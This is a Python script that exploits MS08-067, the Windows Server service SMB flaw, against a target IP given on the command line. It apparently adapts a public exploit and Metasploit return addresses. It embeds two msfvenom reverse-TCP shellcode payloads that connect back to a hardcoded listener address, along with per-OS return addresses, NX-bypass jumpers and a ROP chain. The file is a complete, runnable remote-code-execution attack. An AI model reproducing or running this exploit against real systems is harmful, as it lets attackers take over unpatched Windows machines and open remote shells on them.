import struct
import time
import sys

from threading import Thread  # Thread is imported incase you would like to modify

try:

    #from impacket import smb

    #from impacket import uuid

    #from impacket.dcerpc import dcerpc

    #from impacket.dcerpc import transport

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport



except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)

print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'

# Shellcode: Staged Reverse TCP shellcode for meterpreter
# Badchars: \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40
# Payload size: 380 bytes + 30 NOPS
# Make sure you set meterpreter EXITFUNC=thread  - Important!
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.63 LPORT=4444EXITFUNC=process -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c
shellcode = (
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90"
"\x33\xc9\x83\xe9\xa5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xbe\xaa\x8e\xda\x83\xee\xfc\xe2\xf4\x42\x42\x0c\xda\xbe\xaa"
"\xee\x53\x5b\x9b\x4e\xbe\x35\xfa\xbe\x51\xec\xa6\x05\x88\xaa"
"\x21\xfc\xf2\xb1\x1d\xc4\xfc\x8f\x55\x22\xe6\xdf\xd6\x8c\xf6"
"\x9e\x6b\x41\xd7\xbf\x6d\x6c\x28\xec\xfd\x05\x88\xae\x21\xc4"
"\xe6\x35\xe6\x9f\xa2\x5d\xe2\x8f\x0b\xef\x21\xd7\xfa\xbf\x79"
"\x05\x93\xa6\x49\xb4\x93\x35\x9e\x05\xdb\x68\x9b\x71\x76\x7f"
"\x65\x83\xdb\x79\x92\x6e\xaf\x48\xa9\xf3\x22\x85\xd7\xaa\xaf"
"\x5a\xf2\x05\x82\x9a\xab\x5d\xbc\x35\xa6\xc5\x51\xe6\xb6\x8f"
"\x09\x35\xae\x05\xdb\x6e\x23\xca\xfe\x9a\xf1\xd5\xbb\xe7\xf0"
"\xdf\x25\x5e\xf5\xd1\x80\x35\xb8\x65\x57\xe3\xc2\xbd\xe8\xbe"
"\xaa\xe6\xad\xcd\x98\xd1\x8e\xd6\xe6\xf9\xfc\xb9\x23\x66\x25"
"\x6e\x12\x1e\xdb\xbe\xaa\xa7\x1e\xea\xfa\xe6\xf3\x3e\xc1\x8e"
"\x25\x6b\xc0\x84\xb2\xb4\xa1\x8e\xe5\xd6\xa8\x8e\xcb\xe2\x23"
"\x68\x8a\xee\xfa\xde\x9a\xee\xea\xde\xb2\x54\xa5\x51\x3a\x41"
"\x7f\x19\xb0\xae\xfc\xd9\xb2\x27\x0f\xfa\xbb\x41\x7f\x0b\x1a"
"\xca\xa0\x71\x94\xb6\xdf\x62\x32\xd9\xaa\x8e\xda\xd4\xaa\xe4"
"\xde\xe8\xfd\xe6\xd8\x67\x62\xd1\x25\x6b\x29\x76\xda\xc0\x9c"
"\x05\xec\xd4\xea\xe6\xda\xae\xaa\x8e\x8c\xd4\xaa\xe6\x82\x1a"
"\xf9\x6b\x25\x6b\x39\xdd\xb0\xbe\xfc\xdd\x8d\xd6\xa8\x57\x12"
"\xe1\x55\x5b\x59\x46\xaa\xf3\xf2\xe6\xc2\x8e\x9a\xbe\xaa\xe4"
"\xda\xee\xc2\x85\xf5\xb1\x9a\x71\x0f\xe9\xc2\xfb\xb4\xf3\xcb"
"\x71\x0f\xe0\xf4\x71\xd6\x9a\xa5\x0b\xaa\x41\x55\x71\x33\x25"
"\x55\x71\x25\xbf\x69\xa7\x1c\xcb\x6b\x4d\x61\x5e\xb7\xa4\xd0"
"\xd6\x0c\x1b\x67\x23\x55\x5b\xe6\xb8\xd6\x84\x5a\x45\x4a\xfb"
"\xdf\x05\xed\x9d\xa8\xd1\xc0\x8e\x89\x41\x7f\x8e\xda"
)

# Shellcode2 - Standard Reverse TCP shellcode
# Badchars: \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40
# Payload size: 348 szie + 62 NOPS
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.63 LPORT=4445 EXITFUNC=process -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c
# Ensure EXITFUNC is set to process. If process doesn't work try others.
shellcode2 = (
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xf4\xf4\xba\xb7\x83\xee\xfc\xe2\xf4\x08\x1c\x38\xb7\xf4\xf4"
"\xda\x3e\x11\xc5\x7a\xd3\x7f\xa4\x8a\x3c\xa6\xf8\x31\xe5\xe0"
"\x7f\xc8\x9f\xfb\x43\xf0\x91\xc5\x0b\x16\x8b\x95\x88\xb8\x9b"
"\xd4\x35\x75\xba\xf5\x33\x58\x45\xa6\xa3\x31\xe5\xe4\x7f\xf0"
"\x8b\x7f\xb8\xab\xcf\x17\xbc\xbb\x66\xa5\x7f\xe3\x97\xf5\x27"
"\x31\xfe\xec\x17\x80\xfe\x7f\xc0\x31\xb6\x22\xc5\x45\x1b\x35"
"\x3b\xb7\xb6\x33\xcc\x5a\xc2\x02\xf7\xc7\x4f\xcf\x89\x9e\xc2"
"\x10\xac\x31\xef\xd0\xf5\x69\xd1\x7f\xf8\xf1\x3c\xac\xe8\xbb"
"\x64\x7f\xf0\x31\xb6\x24\x7d\xfe\x93\xd0\xaf\xe1\xd6\xad\xae"
"\xeb\x48\x14\xab\xe5\xed\x7f\xe6\x51\x3a\xa9\x9c\x89\x85\xf4"
"\xf4\xd2\xc0\x87\xc6\xe5\xe3\x9c\xb8\xcd\x91\xf3\x0b\x6f\x0f"
"\x64\xf5\xba\xb7\xdd\x30\xee\xe7\x9c\xdd\x3a\xdc\xf4\x0b\x6f"
"\xe7\xa4\xa4\xea\xf7\xa4\xb4\xea\xdf\x1e\xfb\x65\x57\x0b\x21"
"\x2d\xdd\xf1\x9c\xb0\xbc\xf4\xcb\xd2\xb5\xf4\xe5\xe7\x3e\x12"
"\x9e\xaa\xe1\xa3\x9c\x23\x12\x80\x95\x45\x62\x71\x34\xce\xbb"
"\x0b\xba\xb2\xc2\x18\x9c\x4a\x02\x56\xa2\x45\x62\x9c\x97\xd7"
"\xd3\xf4\x7d\x59\xe0\xa3\xa3\x8b\x41\x9e\xe6\xe3\xe1\x16\x09"
"\xdc\x70\xb0\xd0\x86\xb6\xf5\x79\xfe\x93\xe4\x32\xba\xf3\xa0"
"\xa4\xec\xe1\xa2\xb2\xec\xf9\xa2\xa2\xe9\xe1\x9c\x8d\x76\x88"
"\x72\x0b\x6f\x3e\x14\xba\xec\xf1\x0b\xc4\xd2\xbf\x73\xe9\xda"
"\x48\x21\x4f\x4a\x02\x56\xa2\xd2\x11\x61\x49\x27\x48\x21\xc8"
"\xbc\xcb\xfe\x74\x41\x57\x81\xf1\x01\xf0\xe7\x86\xd5\xdd\xf4"
"\xa7\x45\x62"
)

nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
            "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
                  28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
        'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port = port

        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print 'Windows 2000 Universal\n'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796,
                       'pop ecx / ret': 0x2e796 + 6,
                       'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f,
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56,
                       'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)

        print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory(
            'ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        # Change shellcode to your required shellcode
        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode2 + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
               "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2

        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub = server + "\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + \
                      path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"

        return

    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub)
        time.sleep(5)
        print 'Exploit finish\n'


if __name__ == '__main__':

    try:

        target = sys.argv[1]
        os = sys.argv[2]

    except IndexError:

        print '\nUsage: %s <target ip>\n' % sys.argv[0]
        print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
        print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'
        print 'Example: MS08_067.py 192.168.1.1 3 for Windows 2003 SP0 Universal\n'
        print 'Example: MS08_067.py 192.168.1.1 4 for Windows 2003 SP1 English\n'
        print 'Example: MS08_067.py 192.168.1.1 5 for Windows XP SP3 French (NX)\n'
        print 'Example: MS08_067.py 192.168.1.1 6 for Windows XP SP3 English (NX)\n'
        print 'Example: MS08_067.py 192.168.1.1 7 for Windows XP SP3 English (AlwaysOn NX)\n'
        sys.exit(-1)

current = SRVSVC_Exploit(target, os)

current.start()
